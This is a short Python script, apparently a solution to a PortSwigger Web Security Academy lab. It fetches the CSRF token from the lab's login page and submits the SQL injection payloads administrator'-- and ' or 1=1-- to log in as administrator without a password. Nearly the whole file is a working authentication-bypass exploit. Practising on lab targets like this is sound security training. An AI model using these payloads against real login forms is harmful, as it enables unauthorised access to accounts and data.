import requests
import urllib.parse


# SQL injection vulnerability allowing login bypass
## I got this after commenting out in the password field as well. I think I was breaking the string
with requests.Session() as s:
    url = 'https://0ae800b8037244fec013040e0084003e.web-security-academy.net/login'
    session = s.get(url)
    token = session.text.split('value="')[1].split('"')[0]
    response = s.post(url, data={
    'csrf': token,
    'username': urllib.parse.quote("administrator'--"), 
    'password': "' or 1=1--"
    })
    if "Invalid username or password." in response.text:
        print('Invalid username or password')
    elif "Internal Server Error" in response.text:
        print(response.text)
    else:
        print(response.text)
